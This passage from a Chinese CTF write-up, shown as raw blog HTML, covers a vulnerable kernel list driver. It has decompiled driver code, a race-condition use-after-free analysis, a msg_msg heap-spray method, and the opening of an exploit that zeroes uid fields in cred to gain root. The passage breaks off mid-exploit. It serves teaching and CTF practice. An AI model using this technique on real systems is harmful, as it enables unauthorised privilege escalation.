class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">remove_item</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __int64 v1; <span class="comment">// rax</span></span><br><span class="line">    __int64 v2; <span class="comment">// rdx</span></span><br><span class="line">    __int64 v3; <span class="comment">// rdi</span></span><br><span class="line">    __int64 v5; <span class="comment">// rdi</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( a1 &gt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        mutex_lock(&amp;list_lock);</span><br><span class="line">        <span class="keyword">if</span> ( !a1 )</span><br><span class="line">        &#123;</span><br><span class="line">            v5 = g_list;</span><br><span class="line">            <span class="keyword">if</span> ( g_list )</span><br><span class="line">            &#123;</span><br><span class="line">                g_list = *(g_list + <span class="number">16</span>);</span><br><span class="line">                put(v5);</span><br><span class="line">                mutex_unlock(&amp;list_lock);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">        &#125;</span><br><span class="line">        v1 = g_list;</span><br><span class="line">        <span class="keyword">if</span> ( a1 != <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> ( !g_list )</span><br><span class="line">            &#123;</span><br><span class="line">                LABEL_12:</span><br><span class="line">                mutex_unlock(&amp;list_lock);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            v2 = <span class="number">1LL</span>;</span><br><span class="line">            <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">            &#123;</span><br><span class="line">                ++v2;</span><br><span class="line">                v1 = *(v1 + <span class="number">16</span>);</span><br><span class="line">                <span class="keyword">if</span> ( a1 == v2 )</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">if</span> ( !v1 )</span><br><span class="line">                    <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        v3 = *(v1 + <span class="number">0x10</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v3 )</span><br><span class="line">        &#123;</span><br><span class="line">            *(v1 + <span class="number">0x10</span>) = *(v3 + <span class="number">0x10</span>);</span><br><span class="line">            put(v3);</span><br><span class="line">            mutex_unlock(&amp;list_lock);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在删除函数可以看出来这里并没有直接kfree来进行删除，而是调用了put函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">put</span><span class="params">(<span class="keyword">volatile</span> <span class="keyword">signed</span> __int32 *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !_InterlockedDecrement(a1) )</span><br><span class="line">      <span class="keyword">return</span> kfree(a1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而这个put函数就是对chunk的inuse位进行减一的操作，如果为0则进行kfree，结合上面的remove函数其中的脱链操作也是没有问题的，不存在UAF</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">select_item</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __int64 v2; <span class="comment">// rbx</span></span><br><span class="line">    __int64 v3; <span class="comment">// rax</span></span><br><span class="line">    __int64 *v4; <span class="comment">// rbp</span></span><br><span class="line"></span><br><span class="line">    mutex_lock(&amp;list_lock);</span><br><span class="line">    v2 = g_list;</span><br><span class="line">    <span class="keyword">if</span> ( a2 &gt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( !g_list )</span><br><span class="line">        &#123;</span><br><span class="line">            LABEL_8:</span><br><span class="line">            mutex_unlock(&amp;list_lock);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        v3 = <span class="number">0LL</span>;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            ++v3;</span><br><span class="line">            v2 = *(v2 + <span class="number">0x10</span>);</span><br><span class="line">            <span class="keyword">if</span> ( a2 == v3 )</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">if</span> ( !v2 )</span><br><span class="line">                <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !v2 )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">    get(v2);</span><br><span class="line">    mutex_unlock(&amp;list_lock);</span><br><span class="line">    v4 = *(a1 + <span class="number">0xC8</span>);</span><br><span class="line">    mutex_lock(v4 + <span class="number">1</span>);</span><br><span class="line">    put(*v4);</span><br><span class="line">    *v4 = v2;</span><br><span class="line">    mutex_unlock(v4 + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再看select函数，这一函数实现的功能是选取一个chunk放到(fd+0xc8)位置。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">list_head</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __int64 v1; <span class="comment">// rbx</span></span><br><span class="line">    <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">    mutex_lock(&amp;list_lock);</span><br><span class="line">    get(g_list);</span><br><span class="line">    v1 = g_list;</span><br><span class="line">    mutex_unlock(&amp;list_lock);</span><br><span class="line">    v2 = -(copy_to_user(a1, v1, *(v1 + <span class="number">8</span>) + <span class="number">0x18</span>LL) != <span class="number">0</span>) &amp; <span class="number">0xFFFFFFFFFFFFFFEA</span>LL;</span><br><span class="line">    put(g_list);</span><br><span class="line">    <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>list_head函数则是取出chunk内容，这里的size是在create时放在堆块中的size。</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>题目中题看上去是没有任何问题的，但是在启动脚本中我们可以看到：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line"></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -enable-kvm \</span><br><span class="line">    -cpu kvm64,+smep \</span><br><span class="line">    -kernel ./bzImage \</span><br><span class="line">    -append <span class="string">&quot;console=ttyS0 root=/dev/ram rw oops=panic panic=1 quiet kaslr&quot;</span> \</span><br><span class="line">    -initrd ./rootfs.cpio \</span><br><span class="line">    -nographic \</span><br><span class="line">    -m <span class="number">512</span>M \</span><br><span class="line">    -smp cores=<span class="number">2</span>,threads=<span class="number">2</span>,sockets=<span class="number">1</span> \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -nographic \</span><br><span class="line">    -s</span><br></pre></td></tr></table></figure><p>启动了两个核心，虽然程序使用了互斥锁但任存在条件竞争漏洞</p><p>在create的入链操作中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mutex_lock(&amp;list_lock);</span><br><span class="line">v5 = g_list;</span><br><span class="line">g_list = chunk;</span><br><span class="line">*(chunk + <span class="number">0x10</span>) = v5;</span><br><span class="line">mutex_unlock(&amp;list_lock);</span><br></pre></td></tr></table></figure><p>可以看到这里是首先上锁，然后进行操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mutex_lock(&amp;list_lock);</span><br><span class="line">get(g_list);</span><br><span class="line">v1 = g_list;</span><br><span class="line">mutex_unlock(&amp;list_lock);</span><br><span class="line">v2 = -(copy_to_user(a1, v1, *(v1 + <span class="number">8</span>) + <span class="number">0x18</span>LL) != <span class="number">0</span>) &amp; <span class="number">0xFFFFFFFFFFFFFFEA</span>LL;</span><br><span class="line">put(g_list);</span><br></pre></td></tr></table></figure><p>然而在list_head函数中是在获取了链中的第一个chunk就会释放锁，并且最后会进行put函数，如果我们能够在释放锁之后，put函数之前让create新建的chunk入链则会让新入链的chunk进入put函数，然而新chunk的inuse位为1，所以就会直接free掉，那么此时就存在了UAF的chunk了。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>这里就接着看read和write函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">list_read</span><span class="params">(__int64 a1, __int64 a2, <span class="keyword">unsigned</span> __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __int64 *v5; <span class="comment">// r13</span></span><br><span class="line">    __int64 v6; <span class="comment">// rsi</span></span><br><span class="line">    _QWORD *v7; <span class="comment">// rdi</span></span><br><span class="line"></span><br><span class="line">    v5 = *(a1 + <span class="number">0xC8</span>);</span><br><span class="line">    mutex_lock(v5 + <span class="number">1</span>);</span><br><span class="line">    v6 = *v5;</span><br><span class="line">    <span class="keyword">if</span> ( *v5 )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( *(v6 + <span class="number">8</span>) &lt;= a3 )</span><br><span class="line">            a3 = *(v6 + <span class="number">8</span>);</span><br><span class="line">        v7 = v5 + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> ( copy_to_user(a2, v6 + <span class="number">0x18</span>, a3) )</span><br><span class="line">        &#123;</span><br><span class="line">            mutex_unlock(v7);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            mutex_unlock(v7);</span><br><span class="line">            <span class="keyword">return</span> a3;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        mutex_unlock(v5 + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里可以看到read函数操作的chunk就是我们在select函数中放到(fd+0xc8)位置的chunk，并且只要我们传入的第三个参数不大于chunk中记录size的位置就可以进行读取</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">list_write</span><span class="params">(__int64 a1, __int64 a2, <span class="keyword">unsigned</span> __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __int64 *v4; <span class="comment">// rbp</span></span><br><span class="line">    __int64 v5; <span class="comment">// rdi</span></span><br><span class="line">    __int64 v6; <span class="comment">// rax</span></span><br><span class="line">    _QWORD *v7; <span class="comment">// rdi</span></span><br><span class="line"></span><br><span class="line">    v4 = *(a1 + <span class="number">0xC8</span>);</span><br><span class="line">    mutex_lock(v4 + <span class="number">1</span>);</span><br><span class="line">    v5 = *v4;</span><br><span class="line">    <span class="keyword">if</span> ( *v4 )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( *(v5 + <span class="number">8</span>) &lt;= a3 )</span><br><span class="line">            a3 = *(v5 + <span class="number">8</span>);</span><br><span class="line">        v6 = copy_from_user(v5 + <span class="number">0x18</span>, a2, a3);</span><br><span class="line">        v7 = v4 + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v6 )</span><br><span class="line">        &#123;</span><br><span class="line">            mutex_unlock(v7);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            mutex_unlock(v7);</span><br><span class="line">            <span class="keyword">return</span> a3;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        mutex_unlock(v4 + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>write函数类似于上面的read函数。</p><p>那么我们的思路就是覆盖上面chunk存放size的位置即可了，这样我们就可以实现任意地址写了。那么我们就需要用到堆喷的技术，内核的堆喷我的理解就是申请大量的chunk，那么大概率会一个chunk落在期望的位置上，而这道题目我们期望的位置也就是存在UAF的堆块的位置。这道题因为在init中的限制，这里选择的msgsnd进行堆喷，下面是进行堆喷的使用模板：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUFF_SIZE 96-48</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">long</span> mtype;</span><br><span class="line">    <span class="keyword">char</span> mtext[BUFF_SIZE];</span><br><span class="line">&#125; msg;</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(msg.mtext, <span class="number">0x42</span>, BUFF_SIZE<span class="number">-1</span>);</span><br><span class="line">msg.mtext[BUFF_SIZE] = <span class="number">0</span>;</span><br><span class="line">msg.mtype = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> msqid = msgget(IPC_PRIVATE, <span class="number">0644</span> | IPC_CREAT);</span><br><span class="line"></span><br><span class="line">msgsnd(msqid, &amp;msg, <span class="keyword">sizeof</span>(msg.mtext), <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>在一次msgsnd的过程中会申请一个size为96的chunk，其中前面的48字节为不可控的内容</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line"><span class="keyword">long</span> m_type;</span><br><span class="line"><span class="keyword">size_t</span> m_ts;<span class="comment">/* message text size */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="keyword">void</span> *security;</span><br><span class="line"><span class="comment">/* the actual message follows immediately */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>好在msg_msg结构体的前16个字节为两个指针，并且后八位正好落在chunk的size位上，那么如果有一个msg_msg结构体落在了我们的UAF的chunk上我们就可以进行任意地址读写了。接着的思路就是提权，在前两篇的kernel文章中提到了三种提权方式，相比较下使用修改cred结构体的提权方式更为简单，不熟悉的朋友可以去看一下 <a href="https://cv196082.gitee.io/2022/08/03/kernel-pwn%E5%86%85%E5%AD%98%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%86%99%E6%8F%90%E5%8D%87%E6%9D%83%E9%99%90/">kernel pwn 任意地址读写提升权限[1]</a>  <strong>不过这道题目即便是泄露了地址也无法计算当前chunk的地址与cred结构体的地址的偏移所以没法直接使用以前的方法</strong> 这里更好的办法是直接根据uid去寻找cred结构体，因为在上面那片文章cred结构体是通过kmem_cache_alloc创建的。</p><h3 id="综上，exp"><a href="#综上，exp" class="headerlink" title="综上，exp"></a>综上，exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/auxv.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUFF_SIZE 96 - 48</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">struct chunk&#123;</span></span><br><span class="line"><span class="comment">    inuse</span></span><br><span class="line"><span class="comment">    size</span></span><br><span class="line"><span class="comment">    prev</span></span><br><span class="line"><span class="comment">    buf</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">create_chunk_arg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> size;</span><br><span class="line">    <span class="keyword">char</span> *buf;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> mtype;</span><br><span class="line">    <span class="keyword">char</span> mtext[BUFF_SIZE];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_cred_root</span><span class="params">(<span class="keyword">char</span> *cred, <span class="keyword">int</span> len, <span class="keyword">int</span> id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i += <span class="number">4</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (*(<span class="keyword">int</span> *)(cred + i) == id)</span><br><span class="line">            *(<span class="keyword">int</span> *)(cred + i) = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_hex</span><span class="params">(<span class="keyword">char</span> *buf, <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;data :\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; (size / <span class="number">8</span>); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, i / <span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; %16llx&quot;</span>, *(<span class="keyword">size_t</span> *)(buf + i * <span class="number">8</span>));</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">myMemmem</span><span 